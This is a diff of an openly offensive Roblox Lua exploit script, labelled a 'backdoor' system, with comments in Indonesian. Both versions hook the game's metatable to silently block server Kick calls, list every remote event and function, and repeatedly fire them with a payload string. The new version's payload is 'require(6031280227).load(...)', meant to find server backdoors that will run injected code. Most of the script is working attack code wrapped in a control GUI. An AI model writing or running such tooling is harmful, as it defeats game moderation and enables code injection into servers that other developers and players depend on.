@@ -1,10 +1,11 @@
--- [[ SPTZYY ULTIMATE BACKDOOR + ANTI-KICK ]] --
+-- [[ SPTZYY ULTIMATE ALL-IN-ONE SYSTEM ]] --
+-- Fitur: Brute Force, Remote Finder, Anti-Kick (Real Bypass), Auto-Scroll Log
 
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
 -- ==========================================
--- LOGIKA ANTI-KICK (REAL BYPASS)
+-- LOGIKA ANTI-KICK (SILENT PROTECT)
 -- ==========================================
 local mt = getrawmetatable(game)
 local old = mt.__namecall
@@ -12,66 +13,84 @@ setreadonly(mt, false)
 
 mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
-    local args = {...}
-    
-    -- Jika game mencoba memanggil fungsi Kick pada pemain
     if tostring(method) == "Kick" or tostring(method) == "kick" then
-        print("🛡️ SPTZYY PROTECT: Mencegah Kick dari server!")
-        return nil -- Membatalkan perintah kick
+        warn("🛡️ SPTZYY PROTECT: Perintah Kick Diblokir!")
+        return nil 
     end
-    
-    return old(self, unpack(args))
+    return old(self, ...)
 end)
-
 setreadonly(mt, true)
--- ==========================================
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Sptzyy_Security_System"
-ScreenGui.Parent = game.CoreGui
+-- ==========================================
+-- UI SETUP (Satu GUI Utama)
+-- ==========================================
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "Sptzyy_Ultimate_Hub"
 ScreenGui.ResetOnSpawn = false
 
--- Variabel Global
-_G.BruteActive = false
-local FoundRemotes = {}
-
--- ICON SUPPORT
 local SupportIcon = Instance.new("ImageButton", ScreenGui)
 SupportIcon.Size = UDim2.new(0, 60, 0, 60)
 SupportIcon.Position = UDim2.new(0.05, 0, 0.4, 0)
-SupportIcon.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SupportIcon.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 SupportIcon.Image = "rbxassetid://6031280227"
 SupportIcon.Draggable = true
 SupportIcon.Active = true
 Instance.new("UICorner", SupportIcon).CornerRadius = UDim.new(1, 0)
 
--- GUI 1: BRUTE CONSOLE (LOADING ANIMATION)
-local ConsoleGui = Instance.new("Frame", ScreenGui)
-ConsoleGui.Size = UDim2.new(0, 300, 0, 350)
-ConsoleGui.Position = UDim2.new(0.3, -150, 0.5, -175)
-ConsoleGui.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-ConsoleGui.Visible = false
-Instance.new("UICorner", ConsoleGui)
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 520, 0, 360)
+MainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
+MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+MainFrame.Visible = false
+Instance.new("UICorner", MainFrame)
 
-local Title1 = Instance.new("TextLabel", ConsoleGui)
-Title1.Size = UDim2.new(1, 0, 0, 40)
-Title1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Title1.Text = "SECURITY & BRUTE CONSOLE"
-Title1.TextColor3 = Color3.fromRGB(0, 255, 150)
-Title1.Font = Enum.Font.Code
-Instance.new("UICorner", Title1)
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 45)
+Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title.Text = "SPTZYY BACKDOOR SYSTEM - ANTI KICK ACTIVE"
+Title.TextColor3 = Color3.fromRGB(0, 255, 130)
+Title.Font = Enum.Font.Code
+Title.TextSize = 14
+Instance.new("UICorner", Title)
 
-local LogScroll = Instance.new("ScrollingFrame", ConsoleGui)
-LogScroll.Size = UDim2.new(0.9, 0, 0.7, 0)
-LogScroll.Position = UDim2.new(0.05, 0, 0.15, 0)
+-- Container Kiri (Console Log)
+local LeftFrame = Instance.new("Frame", MainFrame)
+LeftFrame.Size = UDim2.new(0.55, -10, 0.75, 0)
+LeftFrame.Position = UDim2.new(0.02, 0, 0.15, 0)
+LeftFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Instance.new("UICorner", LeftFrame)
+
+local LogScroll = Instance.new("ScrollingFrame", LeftFrame)
+LogScroll.Size = UDim2.new(0.95, 0, 0.95, 0)
+LogScroll.Position = UDim2.new(0.025, 0, 0.025, 0)
 LogScroll.BackgroundTransparency = 1
 LogScroll.CanvasSize = UDim2.new(0, 0, 10, 0)
 LogScroll.ScrollBarThickness = 2
-local LogList = Instance.new("UIListLayout", LogScroll)
+Instance.new("UIListLayout", LogScroll)
+
+-- Container Kanan (Remote List)
+local RightFrame = Instance.new("Frame", MainFrame)
+RightFrame.Size = UDim2.new(0.4, -10, 0.75, 0)
+RightFrame.Position = UDim2.new(0.58, 0, 0.15, 0)
+RightFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Instance.new("UICorner", RightFrame)
+
+local FinderScroll = Instance.new("ScrollingFrame", RightFrame)
+FinderScroll.Size = UDim2.new(0.95, 0, 0.95, 0)
+FinderScroll.Position = UDim2.new(0.025, 0, 0.025, 0)
+FinderScroll.BackgroundTransparency = 1
+FinderScroll.ScrollBarThickness = 2
+Instance.new("UIListLayout", FinderScroll).Padding = UDim.new(0, 3)
+
+-- ==========================================
+-- FUNGSI LOGIKA
+-- ==========================================
+_G.BruteActive = false
+local FoundRemotes = {}
 
 local function AddLog(txt, col)
     local l = Instance.new("TextLabel", LogScroll)
-    l.Size = UDim2.new(1, 0, 0, 18)
+    l.Size = UDim2.new(1, 0, 0, 16)
     l.BackgroundTransparency = 1
     l.Text = "> " .. txt
     l.TextColor3 = col or Color3.new(1,1,1)
@@ -81,30 +100,6 @@ local function AddLog(txt, col)
     LogScroll.CanvasPosition = Vector2.new(0, LogScroll.AbsoluteCanvasSize.Y)
 end
 
--- GUI 2: REMOTE FINDER (SCROLL LUAS)
-local FinderGui = Instance.new("Frame", ScreenGui)
-FinderGui.Size = UDim2.new(0, 250, 0, 350)
-FinderGui.Position = UDim2.new(0.7, -125, 0.5, -175)
-FinderGui.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-FinderGui.Visible = false
-Instance.new("UICorner", FinderGui)
-
-local Title2 = Instance.new("TextLabel", FinderGui)
-Title2.Size = UDim2.new(1, 0, 0, 40)
-Title2.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
-Title2.Text = "REMOTE EXPLORER"
-Title2.TextColor3 = Color3.new(1,1,1)
-Title2.Font = Enum.Font.GothamBold
-Instance.new("UICorner", Title2)
-
-local FinderScroll = Instance.new("ScrollingFrame", FinderGui)
-FinderScroll.Size = UDim2.new(0.9, 0, 0.8, 0)
-FinderScroll.Position = UDim2.new(0.05, 0, 0.15, 0)
-FinderScroll.BackgroundTransparency = 1
-FinderScroll.ScrollBarThickness = 3
-Instance.new("UIListLayout", FinderScroll).Padding = UDim.new(0, 5)
-
--- SCAN & BRUTE LOGIC
 local function Scan()
     for _, c in pairs(FinderScroll:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
     FoundRemotes = {}
@@ -112,43 +107,63 @@ local function Scan()
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
             table.insert(FoundRemotes, v)
             local b = Instance.new("TextButton", FinderScroll)
-            b.Size = UDim2.new(1, 0, 0, 30); b.Text = v.Name; b.BackgroundColor3 = Color3.fromRGB(40,40,40); b.TextColor3 = Color3.new(1,1,1)
+            b.Size = UDim2.new(1, 0, 0, 25)
+            b.Text = "[" .. v.ClassName:sub(1,3) .. "] " .. v.Name
+            b.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+            b.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+            b.Font = Enum.Font.SourceSans
+            b.TextSize = 11
             Instance.new("UICorner", b)
         end
     end
-    FinderScroll.CanvasSize = UDim2.new(0, 0, 0, #FoundRemotes * 35)
-    AddLog("🛡️ ANTI-KICK ACTIVE", Color3.fromRGB(0, 255, 0))
-    AddLog("Found " .. #FoundRemotes .. " Remotes", Color3.new(1,1,1))
+    FinderScroll.CanvasSize = UDim2.new(0, 0, 0, #FoundRemotes * 28)
+    AddLog("Scanner: " .. #FoundRemotes .. " Remotes Cached.", Color3.new(0,1,1))
 end
 
--- BUTTONS
-local function NewBtn(p, t, pos, col, f)
-    local b = Instance.new("TextButton", p)
-    b.Size = UDim2.new(0.4, 0, 0, 35); b.Position = pos; b.Text = t; b.BackgroundColor3 = col; b.TextColor3 = Color3.new(1,1,1)
-    b.Font = Enum.Font.GothamBold; Instance.new("UICorner", b)
+-- ==========================================
+-- TOMBOL KONTROL (Bottom Row)
+-- ==========================================
+local function CreateBtn(t, pos, col, f)
+    local b = Instance.new("TextButton", MainFrame)
+    b.Size = UDim2.new(0.3, 0, 0, 35)
+    b.Position = pos
+    b.Text = t
+    b.BackgroundColor3 = col
+    b.TextColor3 = Color3.new(1,1,1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    Instance.new("UICorner", b)
     b.MouseButton1Click:Connect(f)
 end
 
-NewBtn(ConsoleGui, "START BRUTE", UDim2.new(0.05, 0, 0.88, 0), Color3.fromRGB(0, 150, 0), function()
+CreateBtn("START BRUTE", UDim2.new(0.02, 0, 0.91, 0), Color3.fromRGB(0, 130, 0), function()
+    if _G.BruteActive then return end
     _G.BruteActive = true
-    AddLog("LOOP STARTED...", Color3.new(1,1,0))
+    AddLog("BRUTE FORCE INITIALIZED...", Color3.new(1,1,0))
     task.spawn(function()
         while _G.BruteActive do
             for _, r in pairs(FoundRemotes) do
                 if not _G.BruteActive then break end
-                AddLog("Testing: " .. r.Name, Color3.fromRGB(150,150,150))
-                pcall(function() r:FireServer("sptzyy_payload_v3") end)
-                task.wait(0.1)
+                AddLog("Bruting: " .. r.Name, Color3.fromRGB(180, 180, 180))
+                pcall(function() r:FireServer("require(6031280227).load('"..lp.Name.."')") end)
+                task.wait(0.05)
             end
+            task.wait(0.1)
         end
     end)
 end)
 
-NewBtn(ConsoleGui, "STOP", UDim2.new(0.55, 0, 0.88, 0), Color3.fromRGB(150, 0, 0), function() _G.BruteActive = false; AddLog("STOPPED", Color3.new(1,0,0)) end)
-NewBtn(FinderGui, "SCAN MAP", UDim2.new(0.1, 0, 0.88, 0), Color3.fromRGB(0, 80, 200), Scan)
-
-SupportIcon.MouseButton1Click:Connect(function()
-    ConsoleGui.Visible = not ConsoleGui.Visible
-    FinderGui.Visible = ConsoleGui.Visible
-    if ConsoleGui.Visible then Scan() end
+CreateBtn("STOP", UDim2.new(0.35, 0, 0.91, 0), Color3.fromRGB(130, 0, 0), function()
+    _G.BruteActive = false
+    AddLog("PROCESS TERMINATED.", Color3.new(1,0,0))
 end)
+
+CreateBtn("RE-SCAN MAP", UDim2.new(0.68, 0, 0.91, 0), Color3.fromRGB(0, 80, 180), Scan)
+
+-- Open/Close
+SupportIcon.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+    if MainFrame.Visible then Scan() end
+end)
+
+AddLog("SYSTEM READY. ANTI-KICK ENABLED.", Color3.new(0,1,0))
